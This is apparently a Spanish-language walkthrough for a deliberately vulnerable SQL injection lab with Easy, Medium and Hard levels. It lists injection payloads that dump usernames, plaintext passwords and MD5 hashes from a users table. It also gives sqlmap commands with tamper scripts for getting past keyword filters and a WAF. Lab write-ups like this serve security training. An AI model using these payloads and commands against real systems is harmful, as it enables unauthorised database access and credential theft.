Pasos de explotación

  1. Easy: Prueba el payload básico para obtener todos los registros: 
    ' OR '1'='1
  2. Extrae la tabla de usuarios con UNION (Easy): 
    ' UNION SELECT 1,username,password_plain,4,5 FROM users--
  3. Extrae hashes (Easy): ' UNION SELECT 1,username,password_md5,4,5 FROM users--
  4. Medium: Bloquea union, select, drop, insert, update, delete, -- en minúsculas. El filtro usa .lower() así que las mayúsculas tampoco funcionan. Usa sqlmap con tamper scripts: 
    sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch --tamper=between
  5. Hard: WAF con regex \bunion\b, \bselect\b, [';], --. La inyección directa está bloqueada. Usa sqlmap con tamper scripts para intentar bypasses avanzados: 
    sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch \
  --tamper=between,randomcase,space2comment --level=5 --risk=3
  6. Automatización completa con sqlmap (Easy): 
    # Usa un valor que coincida con un producto (Kali, Burp, Flipper, etc.)
sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite --dbs --batch
sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite -D main --tables --batch
sqlmap -u "http://TARGET_IP/sqli/search?q=Kali" --dbms=SQLite -D main -T users --dump --batch
  7. Con Burp Suite: intercepta el GET, envía al Repeater y modifica el parámetro q.
